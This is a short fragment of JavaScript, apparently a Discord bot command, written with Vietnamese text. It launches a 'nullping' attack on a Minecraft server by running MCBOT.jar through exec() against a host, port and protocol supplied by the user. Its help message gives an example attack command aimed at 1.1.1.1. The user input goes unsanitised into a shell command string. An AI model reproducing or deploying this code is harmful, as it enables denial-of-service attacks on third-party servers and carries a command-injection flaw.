...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công ;nullping 1.1.1.1 25565 47`")
...
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCBOT.jar ${host}:${port} ${protocol} nullping 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
